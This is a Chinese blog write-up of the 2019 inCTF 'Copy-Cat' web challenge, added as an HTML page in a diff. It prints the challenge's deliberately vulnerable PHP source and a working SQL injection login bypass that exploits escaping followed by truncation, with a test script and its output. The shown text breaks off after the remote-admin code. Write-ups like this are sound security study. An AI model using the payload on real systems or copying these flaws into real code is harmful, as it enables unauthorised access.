@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言感觉inctf的题目质量是真的高，可以学到很多的东西，因此特意花时间总结一波。 题目难度还是很大的最后只有4个队伍完成了这个挑战。 题目分析题目的源代码：Copy-Cat.zip这是一个白盒测试，提供了完整的源代码。下面是进入这个挑战的首页面，你将会看到一个简单的登陆功能： 如果你分析下载的代码的话，你将会看到用户的账户名和密码通过了下面的验证。login.php123456789101112">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019inCTF的Copy-Cat">
+<meta property="og:url" content="http://yoursite.com/2019/11/24/2019inCTF的Copy-Cat/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言感觉inctf的题目质量是真的高，可以学到很多的东西，因此特意花时间总结一波。 题目难度还是很大的最后只有4个队伍完成了这个挑战。 题目分析题目的源代码：Copy-Cat.zip这是一个白盒测试，提供了完整的源代码。下面是进入这个挑战的首页面，你将会看到一个简单的登陆功能： 如果你分析下载的代码的话，你将会看到用户的账户名和密码通过了下面的验证。login.php123456789101112">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019_inCTF_Cope-cat_1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019_inCTF_Copy-cat_2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019inCTF_Copy-cat_3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019inCTF_Copy-cat_4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019inCTF_Copy-cat_5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019inCTF_Copy-cat_6.png">
+<meta property="og:updated_time" content="2019-11-24T15:28:40.825Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019inCTF的Copy-Cat">
+<meta name="twitter:description" content="前言感觉inctf的题目质量是真的高，可以学到很多的东西，因此特意花时间总结一波。 题目难度还是很大的最后只有4个队伍完成了这个挑战。 题目分析题目的源代码：Copy-Cat.zip这是一个白盒测试，提供了完整的源代码。下面是进入这个挑战的首页面，你将会看到一个简单的登陆功能： 如果你分析下载的代码的话，你将会看到用户的账户名和密码通过了下面的验证。login.php123456789101112">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019_inCTF_Cope-cat_1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/11/24/2019inCTF的Copy-Cat/">
+
+
+
+
+
+  <title>2019inCTF的Copy-Cat | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/24/2019inCTF的Copy-Cat/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2019inCTF的Copy-Cat</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-24T23:28:05+08:00">
+                2019-11-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.7k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  12
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>感觉inctf的题目质量是真的高，可以学到很多的东西，因此特意花时间总结一波。</p>
+<h5 id="题目难度还是很大的最后只有4个队伍完成了这个挑战。"><a href="#题目难度还是很大的最后只有4个队伍完成了这个挑战。" class="headerlink" title="题目难度还是很大的最后只有4个队伍完成了这个挑战。"></a>题目难度还是很大的最后只有4个队伍完成了这个挑战。</h5><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019_inCTF_Cope-cat_1.png" alt></p>
+<h5 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h5><h6 id="题目的源代码：Copy-Cat-zip"><a href="#题目的源代码：Copy-Cat-zip" class="headerlink" title="题目的源代码：Copy-Cat.zip"></a>题目的源代码：<a href="https://github.com/JeonYoungSin/test/files/3652985/Copy-Cat.zip" target="_blank" rel="noopener">Copy-Cat.zip</a></h6><h6 id="这是一个白盒测试，提供了完整的源代码。下面是进入这个挑战的首页面，你将会看到一个简单的登陆功能："><a href="#这是一个白盒测试，提供了完整的源代码。下面是进入这个挑战的首页面，你将会看到一个简单的登陆功能：" class="headerlink" title="这是一个白盒测试，提供了完整的源代码。下面是进入这个挑战的首页面，你将会看到一个简单的登陆功能："></a>这是一个白盒测试，提供了完整的源代码。下面是进入这个挑战的首页面，你将会看到一个简单的登陆功能：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019_inCTF_Copy-cat_2.png" alt></p>
+<h6 id="如果你分析下载的代码的话，你将会看到用户的账户名和密码通过了下面的验证。"><a href="#如果你分析下载的代码的话，你将会看到用户的账户名和密码通过了下面的验证。" class="headerlink" title="如果你分析下载的代码的话，你将会看到用户的账户名和密码通过了下面的验证。"></a>如果你分析下载的代码的话，你将会看到用户的账户名和密码通过了下面的验证。</h6><h6 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a><code>login.php</code></h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"functions.php"</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$user = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$pass = $_POST[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line">$user = check($user);</span><br><span class="line">$pass = check($pass);   <span class="comment">//I know you are naughty!!</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT username, password FROM inctf2019_cat WHERE username='"</span> .$user .<span class="string">"' &amp;&amp; password='"</span> .$pass .<span class="string">"'"</span>;</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span> || $_SESSION[<span class="string">'logged'</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">$_SESSION[<span class="string">'logged'</span>] = <span class="number">1</span>;</span><br><span class="line">header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Incorrect Credentials"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$conn-&gt;close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="可以看到通过用check对输入的username和password进行过滤。"><a href="#可以看到通过用check对输入的username和password进行过滤。" class="headerlink" title="可以看到通过用check对输入的username和password进行过滤。"></a>可以看到通过用check对输入的<code>username</code>和<code>password</code>进行过滤。</h6><h6 id="我们随后跟进check函数，这个函数函数的功能是首先使用real-escape-string函数将用户输入的特殊符号给转义成完全的字符如-quot-39-等，然后还要检查长度值。"><a href="#我们随后跟进check函数，这个函数函数的功能是首先使用real-escape-string函数将用户输入的特殊符号给转义成完全的字符如-quot-39-等，然后还要检查长度值。" class="headerlink" title="我们随后跟进check函数，这个函数函数的功能是首先使用real_escape_string函数将用户输入的特殊符号给转义成完全的字符如(&quot;,&#39;,\)等，然后还要检查长度值。"></a>我们随后跟进check函数，这个函数函数的功能是首先使用<code>real_escape_string</code>函数将用户输入的特殊符号给转义成完全的字符如(&quot;,&#39;,\)等，然后还要检查长度值。</h6><h6 id="functions-php"><a href="#functions-php" class="headerlink" title="functions.php"></a><code>functions.php</code></h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $conn;</span><br><span class="line">    $str = $conn-&gt;real_escape_string($str);</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($tocheck)</span></span>&#123;</span><br><span class="line">  $tocheck = trim(escape($tocheck));</span><br><span class="line">  <span class="keyword">if</span>(strlen($tocheck)&lt;<span class="number">5</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"For God Sake, don't try to HACK me!!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(strlen($tocheck)&gt;<span class="number">11</span>)&#123;</span><br><span class="line">    $tocheck = substr($tocheck, <span class="number">0</span>, <span class="number">11</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $tocheck;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ExtractZipFile</span><span class="params">($file,$path)</span></span>&#123;</span><br><span class="line">  $zip = <span class="keyword">new</span> ZipArchive;</span><br><span class="line">  <span class="keyword">if</span> ($zip-&gt;open($file) === <span class="keyword">TRUE</span>) &#123;</span><br><span class="line">    $zip-&gt;extractTo($path);</span><br><span class="line">    $zip-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CheckDir</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $files = scandir($path);</span><br><span class="line">    <span class="keyword">foreach</span> ($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        $filepath = <span class="string">"$path/$file"</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_file($filepath)) &#123;</span><br><span class="line">            $parts = pathinfo($file);</span><br><span class="line">            $ext = strtolower($parts[<span class="string">'extension'</span>]);</span><br><span class="line">            <span class="keyword">if</span> (strpos($ext, <span class="string">'php'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'pl'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'py'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'cgi'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'asp'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'js'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'rb'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">		strpos($ext, <span class="string">'htaccess'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'jar'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">                @chmod($filepath, <span class="number">0666</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                @chmod($filepath, <span class="number">0666</span>);    <span class="comment">// just in case the unlink fails for some reason</span></span><br><span class="line">                unlink($filepath);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($file != <span class="string">'.'</span> &amp;&amp; $file != <span class="string">'..'</span> &amp;&amp; is_dir($filepath)) &#123;</span><br><span class="line">            CheckDir($filepath);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_login</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>($_SESSION[<span class="string">'logged'</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Login first"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>($_SESSION[<span class="string">'admin'</span>]!=<span class="string">"True"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Sorry, It seems you are not Admin...are you? If yes, proove it then !!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">($random)</span></span>&#123;</span><br><span class="line">  $phone_number=<span class="string">"xxxxxxxxxx"</span>;</span><br><span class="line">  <span class="comment">//Send random value to his phone number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="通过仔细的观察上面的代码，我们可以看到如果用户的输入值长度大于11个字符，则可以通过substr截断输入的值，结合上面提到的read-escape-string函数，这将给我们提供了SQL注入的可能。"><a href="#通过仔细的观察上面的代码，我们可以看到如果用户的输入值长度大于11个字符，则可以通过substr截断输入的值，结合上面提到的read-escape-string函数，这将给我们提供了SQL注入的可能。" class="headerlink" title="通过仔细的观察上面的代码，我们可以看到如果用户的输入值长度大于11个字符，则可以通过substr截断输入的值，结合上面提到的read_escape_string函数，这将给我们提供了SQL注入的可能。"></a>通过仔细的观察上面的代码，我们可以看到如果用户的输入值长度大于11个字符，则可以通过substr截断输入的值，结合上面提到的<code>read_escape_string</code>函数，这将给我们提供了SQL注入的可能。</h6><h6 id="利用的方式如下："><a href="#利用的方式如下：" class="headerlink" title="利用的方式如下："></a>利用的方式如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">username = 1234567890\ , password =   or 1#</span><br><span class="line"></span><br><span class="line">result</span><br><span class="line">$sql = &quot;SELECT username, password FROM inctf2019_cat WHERE username=&apos;1234567890\&apos; &amp;&amp; password=&apos; or 1#&apos;;</span><br></pre></td></tr></table></figure>
+
+<h6 id="我们使用下面的代码实验一波："><a href="#我们使用下面的代码实验一波：" class="headerlink" title="我们使用下面的代码实验一波："></a>我们使用下面的代码实验一波：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $str = addslashes($str);</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($tocheck)</span></span>&#123;</span><br><span class="line">    $tocheck = trim(escape($tocheck));</span><br><span class="line">    <span class="keyword">if</span>(strlen($tocheck)&lt;<span class="number">5</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"For God Sake, don't try to HACK me!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(strlen($tocheck)&gt;<span class="number">11</span>)&#123;</span><br><span class="line">        $tocheck = substr($tocheck, <span class="number">0</span>, <span class="number">11</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tocheck;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username =<span class="string">"1234567890\\"</span>;</span><br><span class="line">$password =<span class="string">" or 1#"</span>;</span><br><span class="line">$user=check($username);</span><br><span class="line">$pass=check($password);</span><br><span class="line">$sql = <span class="string">"SELECT username, password FROM inctf2019_cat WHERE username='"</span> .$user .<span class="string">"' &amp;&amp; password='"</span> .$pass .<span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br></pre></td></tr></table></figure>
+
+<h6 id="最终的结果："><a href="#最终的结果：" class="headerlink" title="最终的结果："></a>最终的结果：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password FROM inctf2019_cat WHERE username=&apos;1234567890\&apos; &amp;&amp; password=&apos;or 1#&apos;</span><br></pre></td></tr></table></figure>
+
+<h6 id="现在我们可以绕过第一步成功的登陆，但是登陆后，你跳转到admin-php页面将会显示Sorry-It-seems-you-are-not-Admin…are-you-If-yes-proove-it-then-。"><a href="#现在我们可以绕过第一步成功的登陆，但是登陆后，你跳转到admin-php页面将会显示Sorry-It-seems-you-are-not-Admin…are-you-If-yes-proove-it-then-。" class="headerlink" title="现在我们可以绕过第一步成功的登陆，但是登陆后，你跳转到admin.php页面将会显示Sorry, It seems you are not Admin…are you? If yes, proove it then !!。"></a>现在我们可以绕过第一步成功的登陆，但是登陆后，你跳转到<code>admin.php</code>页面将会显示<code>Sorry, It seems you are not Admin…are you? If yes, proove it then !!</code>。</h6><h6 id="现在我们开始阅读functions下面的源代码找到如下的位置："><a href="#现在我们开始阅读functions下面的源代码找到如下的位置：" class="headerlink" title="现在我们开始阅读functions下面的源代码找到如下的位置："></a>现在我们开始阅读functions下面的源代码找到如下的位置：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>($_SESSION[<span class="string">'admin'</span>]!=<span class="string">"True"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Sorry, It seems you are not Admin...are you? If yes, proove it then !!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="这段代码显示了怎样判断用户是admin的。"><a href="#这段代码显示了怎样判断用户是admin的。" class="headerlink" title="这段代码显示了怎样判断用户是admin的。"></a>这段代码显示了怎样判断用户是<code>admin</code>的。</h6><h6 id="现在我们要看它在哪里设置了成为admin跟进到remote-admin-php。"><a href="#现在我们要看它在哪里设置了成为admin跟进到remote-admin-php。" class="headerlink" title="现在我们要看它在哪里设置了成为admin跟进到remote_admin.php。"></a>现在我们要看它在哪里设置了成为admin跟进到<code>remote_admin.php</code>。</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"functions.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">is_login();</span><br><span class="line"></span><br><span class="line"><span class="comment"># If admin wants to open his website remotely</span></span><br><span class="line"></span><br><span class="line">$remote_admin = create_function(<span class="string">""</span>,<span class="string">'if(isset($_SERVER["HTTP_I_AM_ADMIN"]))&#123;$_SERVER["REMOTE_ADDR"] = $_SERVER["HTTP_I_AM_ADMIN"];&#125;'</span>);</span><br><span class="line"></span><br><span class="line">$random = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function admin_$random() &#123;"</span></span><br><span class="line">  .<span class="string">"global \$remote_admin; \$remote_admin();"</span></span><br><span class="line">  .<span class="string">"&#125;"</span>);</span><br><span class="line"></span><br><span class="line">send($random);</span><br><span class="line"></span><br><span class="line">$_GET[<span class="string">'random'</span>]();    <span class="comment">//Only Admin knows next random value; You don't have to worry about HOW?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]==<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">  $_SESSION[<span class="string">'admin'</span>] = <span class="string">"True"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
